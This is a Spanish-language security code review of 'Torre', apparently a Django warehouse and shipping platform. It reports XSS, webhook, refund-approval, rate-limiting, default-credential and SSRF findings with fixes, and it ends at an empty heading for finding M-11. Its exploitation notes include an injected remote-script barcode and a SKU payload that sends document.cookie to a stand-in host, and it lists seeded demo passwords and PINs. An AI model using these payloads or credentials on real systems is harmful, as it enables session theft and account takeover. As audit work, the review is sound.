# Revisión de seguridad — Torre

**Fecha:** 2026-10-15 · **Commit revisado:** `78e323f` (rama `main`, árbol limpio) · **Tipo:** revisión de código (white-box), solo lectura, sin cambios al repo salvo este documento.

**Regla de la revisión (pedida por Chema):** únicamente código. No se usó documentación del repo (`CONVENTIONS.md`, `DEUDA-TECNICA.md`, `HANDOFF.md`, `docs/`), ni memoria de sesiones anteriores, ni comentarios/docstrings como fuente de verdad: cada afirmación se verificó en el código o en la salida de una herramienta. Lo que no se puede verificar desde el repo (valores del `.env` de producción, permisos de archivos en el VPS, configuración real de Caddy) está marcado **[a confirmar en prod]**.

---

## 1. Veredicto en cinco líneas

1. **No hay hallazgos críticos**: nada explotable de forma anónima que dé acceso total a datos o ejecución de código. La base está bien hecha: HMAC correcto en Shopify, tokens aleatorios de 72 bits en rastreo, PIN hasheado, tenancy del portal filtrada en todas las vistas, 151/151 formularios con CSRF, sin SQL crudo, sin `eval`/`pickle`/`shell=True`, `timeout` en las 20 llamadas HTTP salientes.
2. **Cuatro hallazgos altos**, todos con precondición (una cuenta de piso, el admin de la tienda Shopify de un cliente, un token de webhook filtrado o una cuenta del portal): XSS almacenado por subidas de "fotos" sin validar; XSS almacenado por un JSON con `|safe` en Empaque; webhooks de carriers autenticados solo por un token en la URL que queda en los access logs y que, forjado, mueve kardex, pedidos y Shopify; y reembolsos en Shopify ejecutados en un solo POST desde el portal sin umbral ni segundo aprobador.
3. **Catorce medios**: sin límite de intentos (login, reset y PIN de 4 dígitos), política de contraseñas mínima, throttle público que detrás de Caddy cuenta a todo el mundo como una sola IP (DoS trivial de la página de rastreo), defaults inseguros que dependen de una sola variable del `.env`, demo con `admin/admin2026` sin guarda de entorno, secretos de Shopify en claro en BD/admin y en respaldos sin cifrar, SSRF/exfiltración del token vía el dominio de la tienda, rol Mesa plano sin 2FA, replay/sin validación de tienda en el webhook de Shopify, handlers `onsubmit` con códigos SKU, subidas sin tope, carrera de doble reembolso, exports sin límite y 13 CVEs en tres dependencias.
4. **Diecinueve bajos** de endurecimiento (CSV, cabeceras, CSP, GET con efectos, retención de datos, agente de impresión, despliegue).
5. **Qué hacer esta semana** (§10): validar imágenes al subir y servir con `Content-Type` fijo; `json_script` en Empaque; `escapejs` en los `onsubmit`; leer la IP real tras Caddy y usar caché compartida; `validate_password` + `django-axes` (o equivalente) y bloqueo de PIN; guarda de entorno en `seed_demo`; actualizar Django a 5.2.18 y `urllib3`, `sqlparse`, `multidict`, `aiohttp`, `cryptography` (y regenerar el lock, que ya no coincide con el venv); mover los tokens de webhooks de la URL a cabecera (99minutos lo permite) y poner `ENVIA_WEBHOOK_SECRET`; validar `*.myshopify.com`; aplicar el umbral de visto bueno a reembolsos.

---

## 2. Resumen ejecutivo

| Severidad | Cantidad | IDs |
|---|---|---|
| Crítica | 0 | — |
| Alta | 4 | H-01 … H-04 |
| Media | 14 | M-01 … M-14 |
| Baja | 19 | B-01 … B-19 |
| Informativa / verificado OK | — | §8 |

Criterio de severidad (cualitativo, tipo CVSS): **Crítica** = anónimo + impacto total; **Alta** = impacto alto (dinero, inventario, sesión de Mesa, datos de todos los clientes) con una precondición alcanzable (cuenta de bajo privilegio, token filtrado, control de una tienda Shopify); **Media** = precondición fuerte o impacto acotado; **Baja** = defensa en profundidad.

### Los diez que más importan

| ID | Hallazgo | Precondición | Impacto |
|---|---|---|---|
| H-01 | Subida de evidencia sin validar tipo, servida inline con MIME por extensión → XSS almacenado | cuenta de piso (o nadie, si se activa el formulario público de reporte) | JS con la sesión de Mesa: cancelar guías, crear usuarios, reembolsar |
| H-02 | `kit_barras_json\|safe` dentro de `<script>` en Empaque | controlar el catálogo de la tienda Shopify de un cliente (barcode) | JS en la tablet de bodega desde un tenant externo |
| H-03 | Webhooks de carriers: token en la URL (queda en access logs), 99minutos sin firma, envia firma opcional, sin anti-replay | token + número de guía (impreso en la caja) | marcar entregado/retornado/recolectado: kardex, pedido, Shopify, compensaciones PAGADA |
| H-04 | Reembolso en Shopify / reposición en un solo POST (`aprobar=True`) desde el portal; `umbral_visto_bueno_mxn` nunca se aplica | cualquier usuario del portal del cliente | refund hasta el total de cada pedido, sin segundo control |
| M-03 | Throttle público por `REMOTE_ADDR` detrás de Caddy = una sola cubeta para todos | nada | 10 requests/min tumban el rastreo y la página del repartidor para todos |
| M-01 | Sin límite de intentos en login/reset/PIN (PIN 4-6 dígitos) | nada / cuenta interna | credential stuffing; un operador firma por dos |
| M-04 | `DEBUG=1` y `SECRET_KEY` dev por defecto, solo rechazados con `TORRE_HTTPS=1` | despliegue sin esa variable | tracebacks, sesiones forjables, webhooks Shopify sin HMAC |
| M-05 | `seed_demo` crea `admin/admin2026` (superuser) y PINs `1111/2222/3333`, sin guarda de entorno; `set_password` incondicional | correrlo en prod | compromiso total |
| M-06 | Tokens Shopify en claro en BD y completos en el admin; `pg_dump` sin cifrar al bucket operativo | dump o `SPACES_KEY` | shpat_ de cada cliente + PII |
| M-07 | Mesa = rol plano; sin 2FA en Mesa ni `/admin/`; `Tienda.dominio` sin validar (exfil del token por cron) | una cuenta de Mesa | portal de cualquier cliente, tarifario, cancelaciones, token Shopify |

---

## 3. Stack y perímetro (documentado antes de buscar)

**Aplicación.** Django 5.2.17 (Python 3.11.13 en dev), monolito de 15 apps bajo `apps/` (~40 000 líneas Python sin tests/migraciones, 100 templates, 4 JS propios + `qrcode-generator` y `@zxing/library` vendorizados). Tres superficies autenticadas por rol (`PerfilUsuario.rol`): **Mesa** (`/mesa/`, personal de Torre), **Piso** (`/piso/`, operadores de bodega), **Portal** (`/portal/`, usuarios de cada cliente, atados a un `Cliente`); más `/admin/` (Django admin, solo superusers) y `/cuenta/`, `/entrar/`, `/olvide/`, `/restablecer/`.

**Perímetro público (sin sesión):**

| Ruta | Qué es | Autenticación |
|---|---|---|
| `POST /hooks/shopify/<tienda_id>/` | webhooks de Shopify | HMAC-SHA256 con `Tienda.webhook_secret` (fail-closed en prod) |
| `POST /hooks/carriers/envia/<token>/` | rastreo envia.com | token en la URL + firma opcional (`ENVIA_WEBHOOK_SECRET`) |
| `POST /hooks/carriers/99minutos/<token>/` | rastreo 99minutos | token en la URL, sin firma |
| `GET /api/impresion/pendientes/`, `GET …/<id>/pdf/`, `POST …/<id>/resultado/` | relay de impresión (agente en bodega) | Bearer estático `TORRE_TOKEN_IMPRESION` |
| `GET /r/<token>/`, `/pod/`, `POST /reporte/` | rastreo público del comprador | token aleatorio de 12 chars (72 bits) |
| `GET/POST /r/e/<token>/` | página del repartidor (QR de la etiqueta) | token aleatorio de 12 chars |
| `GET /sw.js`, `/static/*` | PWA | — |

**Integraciones salientes:** Shopify Admin API (REST + GraphQL, token por tienda en BD), envia.com (cotizar/comprar/rastrear, `ENVIA_API_KEY`), 99minutos directo (OAuth client credentials), iMile (firma MD5/SHA256 con secretKey), WhatsApp Cloud API, SMTP, Web Push (VAPID, `.pem` local), S3/DigitalOcean Spaces (evidencias, privado).

**Datos sensibles que maneja:** PII de compradores (nombre, teléfono, correo, dirección completa con lat/lng, contenido del pedido) en `Pedido`, `WebhookEvento.payload` (orden completa de Shopify), `Guia.raw`; fotos de evidencia; tokens de Shopify; tarifarios y finanzas de clientes.

**Despliegue (según `deploy/`):** Caddy (TLS automático) → gunicorn 3 workers en `127.0.0.1:8000` (unit systemd, usuario `torre`, `migrate` + `collectstatic` al arrancar) → Postgres 16. Cron de management commands cada 5–30 min. Respaldo diario `pg_dump | gzip` → `/srv/torre/backups` + `s3cmd put` al bucket `torre-evidencia`. Agente de impresión Python stdlib en una PC de bodega con CUPS.

**Controles de seguridad presentes en settings:** `SecurityMiddleware`, `XFrameOptionsMiddleware` (DENY), CSRF, sesiones en BD, `MESSAGE_STORAGE` en sesión; con `TORRE_HTTPS=1`: cookies `Secure`, HSTS 1 año + subdominios, `SECURE_PROXY_SSL_HEADER`, `CSRF_TRUSTED_ORIGINS`, fail-fast si `SECRET_KEY` dev o `DEBUG`. No hay: CSP, rate limiting, 2FA, `CACHES`, límites de subida, validadores de contraseña más allá de longitud.

---

## 4. Metodología y herramientas

1. **Inventario del stack** (§3) para decidir qué buscar: Django/multi-tenant → autorización por vista e IDOR; webhooks → HMAC, replay, idempotencia; subidas → tipo/tamaño/servicio; templates → XSS; integraciones → SSRF, secretos, timeouts; despliegue → cabeceras, logs, respaldos.
2. **Lectura manual** del núcleo (settings, urls, `apps/core` completo, webhooks, API de impresión, rastreo, agente) y verificación puntual de cada hallazgo de los agentes.
3. **Cuatro revisiones paralelas** (agentes), cada una con lectura completa de su área: (a) autenticación/autorización vista por vista en Mesa/Piso/Portal/core/reportes/mensajería (44 + 19 + 19 vistas); (b) los 100 templates, `static/`, service worker y Python que genera HTML; (c) integraciones, adapters, impresión, mensajería, almacenamiento, cron/systemd/Caddy; (d) investigación web de CVEs y guías vigentes (§6).
4. **Herramientas automáticas** (salidas en §11): `pip-audit` sobre `requirements.lock`; `bandit -r apps torre_project deploy scripts -ll`; `semgrep` con `p/django`, `p/python`, `p/secrets`, `p/owasp-top-ten`; `manage.py check --deploy` con entorno de producción simulado y con el entorno de dev; greps dirigidos (`csrf_exempt`, `|safe`, `mark_safe`, `.raw(`, `subprocess`, `eval`, `pickle`, `requests.*` sin `timeout`, `verify=`, `random`, `FILES`, `set_password`, etc.); escaneo del historial de git en busca de secretos.
5. **Fuera de alcance / no verificado:** el servidor (valores reales del `.env`, permisos de archivos, Caddyfile desplegado, versiones instaladas en el venv de prod), las cuentas reales de Shopify/carriers, pruebas dinámicas contra producción, la base de datos de producción (no se consultó).

Falsos positivos descartados: los 18 `django-no-csrf-token` de semgrep (todas las formas POST llevan `{% csrf_token %}`, verificado por formulario); los `directly-returned-format-string` (regla de Flask; aquí son strings de `messages`, autoescapados en template).

---

## 5. Hallazgos

Formato: **Dónde** (archivo:línea) · **Qué** · **Evidencia** · **Impacto** · **Explotación** · **Corrección**.

### 5.1 Severidad ALTA

#### H-01 · XSS almacenado por subidas de evidencia sin validar, servidas inline con MIME deducido de la extensión

- **Dónde:** `apps/core/models.py:197` (`archivo = models.FileField(upload_to=_ruta_evidencia)` — `FileField`, no `ImageField`, sin validators; `_ruta_evidencia` l.174-175 conserva el nombre original); `apps/core/views.py:236-246` (`respuesta_evidencia`: `FileResponse(archivo.open("rb"))` sin `content_type` ni `as_attachment`). Puntos de subida sin validación de contenido: `apps/piso/views.py:793-800` (foto de llegada), `:2075`, `:2116`, `:2132`, `:2221-2227`, `:2258-2274`; `apps/pedidos/services.py:2365`, `:2491`, `:2579`, `:2694`, `:3589`; `apps/mesa/views.py:1943` (POD); y **público** `apps/rastreo/views.py:393-398` (formulario de reporte del comprador, hoy apagado por `TORRE["RASTREO_REPORTE_FORMULARIO"]=False`, `settings.py:290`).
- **Qué:** ningún punto valida tipo, extensión ni tamaño (solo `accept="image/*"` en el HTML, que el cliente controla). La única subida validada del proyecto es la firma del chofer (`apps/piso/views.py:2859-2880`, magia PNG + tope 1.5 MB). Django 5.2 (`FileResponse.set_headers`, verificado en el venv) deduce `Content-Type` del nombre (`foto.html` → `text/html`, `foto.svg` → `image/svg+xml`) y manda `Content-Disposition: inline`. `X-Content-Type-Options: nosniff` no ayuda cuando el tipo declarado ya es HTML/SVG.
- **Impacto:** un archivo HTML/SVG con script subido "como foto" se ejecuta en el origen de Torre con la sesión de quien lo abra. Mesa abre evidencias en pestaña nueva (`mesa/incidencia_detalle.html:186`, `mesa/pedido_detalle.html:273`, `templates/reportes/reporte_dia.html:78`). El script lee el CSRF token y puede disparar cualquier POST de Mesa (cancelar guías, crear usuarios de portal, reembolsar, cambiar tarifario).
- **Explotación:** un operador de piso (tablet compartida) sube `foto.html` como foto de recepción; Mesa hace clic en "ampliar". Si se activa el formulario público, lo hace cualquiera con un token de rastreo, sin cuenta.
- **Corrección:** validar en `EvidenciaFoto.save()` (o en un helper único de captura) que el archivo sea imagen real (`PIL.Image.open(...).verify()` + reabrir), renombrar con la extensión del formato detectado, limitar tamaño (p. ej. 15 MB) y servir siempre con `content_type` explícito del formato guardado; para cualquier cosa que no sea imagen, `as_attachment=True`. Añadir `Content-Security-Policy: sandbox` o `default-src 'none'` a la respuesta de evidencia como segunda capa.

#### H-02 · XSS almacenado en Empaque: JSON con `|safe` dentro de `<script>` con datos del catálogo de Shopify

- **Dónde:** `apps/piso/templates/piso/empaque_pedido.html:285` — `var KIT_BARRAS = {{ kit_barras_json|default:"{}"|safe }};`; origen `apps/piso/views.py:1883-1888` — `json.dumps({s.codigo_barras: s.pk for s in SKU.objects.filter(cliente=pedido.cliente, …)})`.
- **Qué:** `json.dumps` no escapa `<`, `>`, `&` ni `/`; una clave que contenga `</script>` cierra el bloque. `SKU.codigo_barras` (`CharField(max_length=64)`) se escribe desde el sync de Shopify (`apps/integraciones/services.py:1349` ← `shopify.py:712` `nodo.get("barcode")`), desde el CSV de catálogo (`apps/mesa/views.py:3909`) y desde el form de Mesa, sin filtro.
- **Impacto:** JS en la sesión del operador de piso (y de Mesa, que también opera Piso). Es un vector **cross-tenant**: lo controla el administrador de la tienda Shopify de un cliente, no Torre.
- **Explotación:** barcode de una variante = `</script><script src=//x.yz></script>` (38 caracteres); se importa al catálogo; al empacar cualquier pedido de ese cliente con un kit incompleto, se ejecuta.
- **Corrección:** `{{ kit_barras|json_script:"kit-barras" }}` + `JSON.parse(document.getElementById("kit-barras").textContent)` (patrón que ya usan otras 5 pantallas). Mientras, `json.dumps(...).replace("<", "\\u003c")`.

#### H-03 · Webhooks de carriers autenticados solo por un token en la URL; 99minutos sin firma, envia con firma opcional, sin anti-replay; un evento forjado mueve kardex, pedidos, Shopify y compensaciones

- **Dónde:** `apps/integraciones/urls.py:13-14` (`carriers/envia/<str:token>/`, `carriers/99minutos/<str:token>/`); `apps/envios/webhooks.py:34-35` (`_token_valido`, `compare_digest` — bien), `:38-51` (`_firma_envia_valida`: `if not secreto: return True`; no acota `X-Webhook-Timestamp`), `:194-206` (99minutos: solo token); `deploy/torre.service:16` (`--access-logfile -`: la request line con el token va a journald en cada entrega); `apps/envios/management/commands/registrar_webhook_99minutos.py:37` (registra `{"url": url}` aunque la API de 99minutos acepta `headers`).
- **Efectos alcanzables con token + número de guía** (`apps/envios/services.py`): `procesar_evento_carrier` `:1080-1110` solo exige que la guía exista, sea del proveedor y no esté terminal → `_procesar_rastreo` `:1157-1211` transiciona la guía y guarda `info["raw"]`; `_registrar_recoleccion_carrier` `:1218-1264` → `salida_por_carrier` (`apps/pedidos/services.py:2909-2938`) → `marcar_recolectado`: caja DESPACHADO y **kardex despachado**; `_aplicar_efectos` `:1319-1380`: pedido EN_TRANSITO / **ENTREGADO** / **RETORNADO**, incidencias RF P1, cierre de RET, `_evento_fulfillment_shopify` (eventos en Shopify); `_transicionar_pedido` → `compensaciones_por_entrega` (`apps/incidencias/services.py:841-853`: compensaciones APROBADAS → **PAGADA**).
- **Impacto:** quien obtenga el token (journald/access log, panel del carrier, `.env`, historial del navegador de quien lo registró) y un número de guía (impreso en la caja, visible al comprador en Shopify) marca pedidos como entregados/retornados, saca piezas del kardex, cierra retrasos y escribe eventos falsos en Shopify. El token no rota ni caduca.
- **Corrección:** mover el secreto a una cabecera (`X-Torre-Webhook-Token`; 99minutos lo soporta en el registro) o al menos no loguear la ruta (`--access-logformat` sin `%(U)s` para `/hooks/`); exigir `ENVIA_WEBHOOK_SECRET` en prod (fail-closed como Shopify) y rechazar `X-Webhook-Timestamp` fuera de ±5 min; para 99minutos, si no hay firma, filtrar por IP de origen documentada y/o verificar el evento contra su API antes de aplicar efectos irreversibles (ENTREGADO/RETORNO); rotar los tokens actuales después del cambio.

#### H-04 · Compensaciones (reembolso en Shopify, reposición) creadas y ejecutadas en un solo POST, sin umbral ni segundo aprobador; el umbral configurado por cliente nunca se aplica

- **Dónde:** `apps/portal/views.py:590-612` — `crear_compensacion(incidencia, tipo, request.user, "cliente", …, aprobar=True, …)` y `aprobar_compensacion(comp, request.user, "cliente")`; `apps/mesa/views.py:882-899` (Mesa, `aprobar=bool(request.POST.get("aprobar"))`); `apps/incidencias/services.py:558-643` (`crear_compensacion` → `if aprobar: aprobar_compensacion`), `:656-678` (`aprobar_compensacion`: reposición → pedido vuelve a picking y guía nueva; reembolso → `ejecutar_reembolso`), `:680-714` (`refundCreate` real vía `reembolsar_en_shopify`, con `monto` libre si no hay líneas).
- **Control muerto:** `Cliente.umbral_visto_bueno_mxn` (`apps/core/models.py:65`) solo se captura/edita (`apps/mesa/forms.py:122, 289`, `apps/mesa/views.py:3199`); `grep` no encuentra ningún uso en `incidencias/`, `pedidos/` ni `finanzas/`.
- **Impacto:** dinero (refund a compradores desde la tienda del cliente, hasta lo pagado en cada orden) e inventario (reposición → nueva guía, "toda guía se cobra") movidos por una sola persona, sin tope. Una cuenta del portal de bajo nivel, o comprometida (sin 2FA, sin límite de intentos, contraseña débil permitida, ver M-01/M-02), puede reembolsar todos los pedidos del cliente.
- **Explotación:** `POST /portal/incidencias/<pk>/` con `accion=compensacion_crear&tipo=reembolso&monto=…` → Shopify ejecuta el refund al instante.
- **Corrección:** aplicar `umbral_visto_bueno_mxn`: por encima del umbral la compensación queda COTIZADA hasta que la apruebe un segundo actor (Mesa si la propone el cliente, y viceversa); registrar quién propone y quién aprueba; tope diario por cliente; idempotencia en `refundCreate` (ver M-11).

### 5.2 Severidad MEDIA

#### M-01 · Sin límite de intentos en login, restablecimiento de contraseña ni PIN de firma

- **Dónde:** `apps/core/views.py:16-17` (`LoginView` de Django sin throttle), `:41-50` (`OlvideView`); `apps/inventario/services.py:1433-1455` (`_validar_firma`: compara contra hash con mensaje único — bien — pero sin contador ni bloqueo); PIN de 4-6 dígitos (`apps/core/forms.py:27`); la lista de firmantes con PIN se muestra en Piso (`apps/piso/views.py:3380-3388`). No hay `django-axes`, `django-ratelimit` ni uso de `cache` en `apps/core` (requirements y grep).
- **Impacto:** credential stuffing contra `/entrar/` (expuesto a internet por el portal); spam de correos vía `/olvide/`; un operador autenticado prueba los 10 000 PINs de un colega contra el form de ajuste o dictamen (`autorizo_2`/`pin_2`) y "firma por dos personas", anulando el control de doble firma.
- **Corrección:** `django-axes` (bloqueo por usuario+IP) o throttle propio con caché compartida; contador de fallos de PIN por usuario (p. ej. 5 fallos → bloqueo 15 min + evento de auditoría); no listar firmantes.

#### M-02 · Política de contraseñas mínima; alta de usuarios de portal sin validadores; contraseñas en pantalla

- **Dónde:** `torre_project/settings.py:146-148` (solo `MinimumLengthValidator`, 8 chars: `12345678` pasa); `apps/mesa/views.py:3337-3345` (`password = request.POST.get("password") … ; usuario.set_password(password)` sin `validate_password`); `:3399-3410` (reset: `secrets.token_urlsafe(8)` mostrada en el flash); `:3368-3371` (alta: contraseña mostrada si no hay correo real).
- **Impacto:** cuentas del portal (expuestas a internet, con capacidad de reembolsar, H-04) con contraseñas triviales elegidas por Mesa; la contraseña generada aparece en pantalla (sesión de Mesa, pantallas compartidas). Los mensajes van en `SessionStorage` (`settings.py:472`), no en cookie: no se filtran al cliente, pero sí quedan en la pantalla siguiente.
- **Corrección:** `CommonPasswordValidator`, `NumericPasswordValidator`, `UserAttributeSimilarityValidator`, longitud ≥ 12; llamar `validate_password` en el alta; preferir siempre el enlace por correo y eliminar la contraseña tecleada por Mesa.

#### M-03 · Throttle de las páginas públicas por `REMOTE_ADDR` detrás de Caddy: una cubeta global por worker → DoS trivial y 404 falsos

- **Dónde:** `apps/rastreo/views.py:113-120` (`ip = request.META.get("REMOTE_ADDR")`, `if cuenta >= 10: raise Http404`, `cache.set(llave, …, 60)`); `deploy/Caddyfile:7` (`reverse_proxy 127.0.0.1:8000`); no hay lectura de `X-Forwarded-For` en el repo (grep) ni `CACHES` en settings (→ `LocMemCache` por proceso, 3 workers).
- **Impacto:** para Django todos los visitantes son `127.0.0.1`: 10 requests por minuto (×3 workers) dejan en 404 `/r/<token>/`, `/r/<token>/pod/`, `/r/<token>/reporte/` y `/r/e/<token>/` (repartidores) para todo el mundo; con tráfico normal también produce 404 a compradores legítimos. El dedupe de escaneos y el tope de avisos de auxilio tampoco son compartidos entre workers.
- **Corrección:** obtener la IP del primer salto confiable (`X-Forwarded-For` solo si `REMOTE_ADDR` es el proxy; Caddy ya lo manda), caché compartida (`django-redis` o `DatabaseCache`), y responder 429 en vez de 404. **[a confirmar en prod]** si Caddy corre en el mismo host (es lo que indica el `Caddyfile`).

#### M-04 · Defaults inseguros de settings condicionados a `TORRE_HTTPS=1`

- **Dónde:** `torre_project/settings.py:22-25` (`SECRET_KEY` con default público; `DEBUG = TORRE_DEBUG != "0"` → **activo por defecto**); `:30-41` (fail-fast solo si `TORRE_HTTPS=1`); `.env.example:15-17` trae `TORRE_DEBUG=1`, `TORRE_HTTPS=0`; `deploy/torre.service:11` fija `TORRE_DEBUG=0`. Con `DEBUG`, `webhook_shopify` acepta webhooks sin HMAC si la tienda no tiene secret (`apps/integraciones/views.py:45-49`) y `apps/integraciones/services.py` entra en modo mock en 8 puntos (`:277, 624, 909, 966, 1029, 1405, 1516`).
- **Impacto:** un arranque fuera de systemd (gunicorn a mano, `runserver` en un staging, `.env` copiado del ejemplo) sirve tracebacks completos con settings, acepta sesiones/CSRF forjables con la llave pública del repo y procesa webhooks sin firma.
- **Corrección:** invertir el default (`DEBUG` apagado salvo `TORRE_DEBUG=1`), exigir `TORRE_SECRET_KEY` siempre que `DEBUG` esté apagado (no solo con HTTPS), y nunca condicionar la verificación HMAC a `DEBUG` (usar una variable explícita de dev). **[a confirmar en prod]** `.env` con `TORRE_HTTPS=1`, `TORRE_DEBUG=0`, `TORRE_SECRET_KEY` propia.

#### M-05 · Credenciales y PINs por defecto en `seed_demo`, sin guarda de entorno

- **Dónde:** `apps/mesa/management/commands/seed_demo.py:38-47` (`("admin", "admin2026", …, superuser=True)`, `karina/colima2026`, `mario/colima2026`, `nocturno/nocturno2026`, `piso1/piso2026` PIN `1111`, `jefe/jefe2026` PIN `2222`, `mesa1/mesa2026` PIN `3333`); `:269-285` (`get_or_create` + `set_password(password)` **incondicional** + `update_or_create` del perfil con el PIN); `handle` no revisa `DEBUG` ni pide confirmación.
- **Impacto:** si alguna vez se ejecutó en el VPS (o se ejecuta por error), existe un superuser con contraseña conocida y publicada en el repo; además, re-ejecutarlo **resetea** la contraseña de un `admin` existente a `admin2026`.
- **Corrección:** `if not settings.DEBUG: raise CommandError(...)` al inicio; contraseñas aleatorias impresas una vez; no tocar usuarios existentes. **[a confirmar en prod]** que no existan `admin`, `mesa1`, `piso1`, `jefe`, `karina`, `mario`, `nocturno` con esas credenciales.

#### M-06 · Secretos de Shopify en claro en BD y completos en el admin; respaldos de Postgres sin cifrar al bucket operativo

- **Dónde:** `apps/integraciones/models.py:19-33` (`token`, `webhook_secret` CharField en claro); `apps/integraciones/admin.py:6-10` (`TiendaAdmin` sin `exclude`/`readonly_fields`/widget → el change form y el historial muestran ambos íntegros); `deploy/crontab.txt:21` (`pg_dump torre | gzip > /srv/torre/backups/… && s3cmd put … s3://torre-evidencia/respaldos/`: sin cifrado, al mismo bucket `SPACES_BUCKET` que usa la app (`settings.py:482`), sin borrado remoto, permisos de `/srv/torre/backups` y `~/.s3cfg` no definidos). Mesa sí los protege (type=password y últimos 4, `mesa/cliente_detalle.html:93-101`; no se auditan valores, `mesa/views.py:3458-3463`).
- **Impacto:** un dump (local o en el bucket) o la fuga de `SPACES_KEY` entrega los `shpat_` con `write_orders`/`write_fulfillments` de cada cliente, más PII de compradores y hashes de contraseñas. Un superuser ve todos los tokens.
- **Corrección:** cifrar los campos (p. ej. `django-fernet-fields`/`cryptography` con llave en `.env`) o al menos ocultarlos en el admin (`readonly_fields` con últimos 4); cifrar el dump (`age`/`gpg` con llave pública antes de subir), bucket distinto con llave distinta y política de retención/lifecycle; `chmod 700 /srv/torre/backups`, `chmod 600 ~/.s3cfg`.

#### M-07 · Rol Mesa plano, sin 2FA, con todas las palancas; `Tienda.dominio` sin validar permite exfiltrar el token y usar a Torre como proxy

- **Dónde:** todas las vistas de Mesa llevan `@rol_requerido("mesa")` (`apps/core/decorators.py:31-43`) sin sub-roles. Un usuario de Mesa puede: crear usuarios de portal con el correo que quiera y mandarles el acceso (`apps/mesa/views.py:3327-3371`), resetear y activar/desactivar (`:3399-3423`), cambiar `token`/`webhook_secret` de cualquier tienda (`:3430-3485`), editar tarifario y `facturacion_desde` (`:3239-3302`), cancelar pedidos/guías, sustituir guías, quitar de salida (`:1068-1124, 1205-1270`), registrar/quitar reembolsos de paquetería (`:1283-1334`), descartar escrituras a Shopify (`:2974`), reiniciar recepciones (`:2742-2762`) y **reescribir stock sin doble PIN** (reconciliación por CSV `:2234-2320` → `inventario/services.py:2152-2200`; ajustar conteo por posición `:467-500` → `:2294-2330`; mover existencias `:449-460`; editor de recepción `:2797-2843`), mientras `aplicar_ajuste`/`dictaminar_cuarentena` sí exigen dos PINs (`inventario/services.py:1466-1479, 1682-1706`).
- **SSRF / exfiltración:** `apps/mesa/views.py:3434-3436` acepta cualquier `dominio` (`.strip().lower()`, sin exigir `*.myshopify.com`); al editar, un `token` vacío **conserva el actual** (`:3458`); `apps/integraciones/shopify.py:276-282` construye `https://{dominio}/admin/api/…` y manda `X-Shopify-Access-Token`; `:662-665` sigue `resp.links["next"]["url"]` tal cual; `requests` conserva cabeceras custom en redirecciones. El cron `sync_shopify` (cada 15 min, `crontab.txt:12`) hace las llamadas.
- **Impacto:** una sola cuenta de Mesa comprometida (sin 2FA, sin límite de intentos) entra al portal de cualquier cliente, mueve dinero e inventario, y roba el `shpat_` real apuntando el dominio a un host propio (o usa a Torre para alcanzar `https://10.x…` interno con path parcialmente controlable).
- **Corrección:** validar `^[a-z0-9-]+\.myshopify\.com$` (y bloquear el `Location` de redirecciones fuera de ese dominio); 2FA (TOTP) obligatorio para Mesa y `/admin/`; un sub-rol "admin de Mesa" para secretos, tarifario, usuarios y ajustes por CSV; registrar y notificar por correo los cambios de dominio/token.

#### M-08 · Webhook de Shopify: sin validar `X-Shopify-Shop-Domain`, `webhook_id` no firmado (replay con id nuevo), enumeración de `tienda_id` y mensajes reveladores

- **Dónde:** `apps/integraciones/views.py:37` (`get_object_or_404(Tienda, pk=tienda_id, activo=True)`), `:45-53` (HMAC con `tienda.webhook_secret`; nunca compara el header de tienda con `tienda.dominio`; 403 "Tienda sin webhook secret configurado" vs 404), `:62-67` (`webhook_id = X-Shopify-Webhook-Id` — cabecera no cubierta por la firma; sin header, sha256 del cuerpo); efectos en `apps/integraciones/services.py:60-90` (ingesta/cancelación) y `:93-140` (`fulfillment_orders/moved` → `cancelar(pedido)`); `apps/pedidos/services.py:890-933` (`ingerir_pedido_shopify` es upsert por `(tienda, shopify_order_id)`: una orden repetida refresca contacto, dirección no congelada, ediciones y refunds según el payload).
- **Impacto:** (a) un webhook legítimo capturado se reenvía con otro `X-Shopify-Webhook-Id` y se vuelve a aplicar (payload viejo sobre un pedido: dirección/ediciones/cancelación); (b) si dos tiendas comparten signing secret (misma app/partner), el webhook de la tienda A vale en el endpoint de la tienda B (cross-tenant) **[a confirmar]** en las tiendas reales; (c) se enumeran los `tienda_id` existentes y cuáles no tienen secret.
- **Corrección:** comparar `X-Shopify-Shop-Domain` con `tienda.dominio`; ignorar payloads con `updated_at` anterior al último aplicado; incluir `X-Shopify-Triggered-At` en la ventana de aceptación; responder 404 uniforme.

#### M-09 · XSS en handlers inline `onsubmit="return confirm('…{{ sku }}…')"` y `innerHTML` con códigos de SKU

- **Dónde:** `apps/mesa/templates/mesa/incidencia_detalle.html:275` (`{{ comp.resumen_lineas }}`), `apps/mesa/templates/mesa/pedido_detalle.html:106` (`{{ r.detalle }}`); ambos concatenan `f"{cantidad}× {sku}"` (`apps/incidencias/models.py:364-369`, `apps/mesa/views.py:1517`) con el **código del SKU** (≤60 chars, origen Shopify `v["sku"][:60]` en `integraciones/services.py:1348`, o Mesa). `apps/mesa/templates/mesa/bodega_posiciones.html:261` (`aviso.innerHTML = … + codigo + …`) con `codigo` que el propio JS rellena desde `data.sku` de `mesa:bodega_lotes_json` (`:282`).
- **Qué:** dentro de un atributo de evento, Django escapa `'` como `&#x27;`, pero el navegador decodifica la entidad al leer el atributo **antes** de parsear el JS: un SKU `');fetch('//x.yz/'+document.cookie);//` rompe la cadena y ejecuta. Otros 26 handlers con variables usan folios/enteros/usernames (no explotables hoy, pero frágiles).
- **Impacto:** JS en la sesión de Mesa, controlado desde el catálogo de Shopify de un cliente; requiere que Mesa pulse ese botón concreto.
- **Corrección:** `|escapejs` en toda variable dentro de `on*=`, o mejor `data-confirm="{{ … }}"` leído con `dataset` y `addEventListener` (también habilita CSP); `textContent` en vez de `innerHTML` en `bodega_posiciones.html:261`.

#### M-10 · Subidas sin límite de tamaño ni tipo; Pillow sin tope propio; Caddy sin `max_size`

- **Dónde:** `deploy/Caddyfile` (sin `request_body { max_size }`); Django no limita `FILES` (`DATA_UPLOAD_MAX_MEMORY_SIZE` solo aplica a campos); ningún `.size`/`content_type` en los puntos de H-01; `apps/core/models.py:223-245` (`Image.open` + `thumbnail` dentro del `save()` del request, límite por defecto de Pillow ~89 Mpx aviso / ~178 Mpx error) y `apps/core/management/commands/generar_miniaturas.py`.
- **Impacto:** un usuario de piso llena disco/Spaces con archivos arbitrarios o agota la RAM de un worker (de 3) con imágenes enormes.
- **Corrección:** `request_body { max_size 20MB }` en Caddy; tope por archivo en el servidor; `Image.MAX_IMAGE_PIXELS` explícito y miniaturas fuera del request si crecen.

#### M-11 · Posible doble reembolso en Shopify por carrera

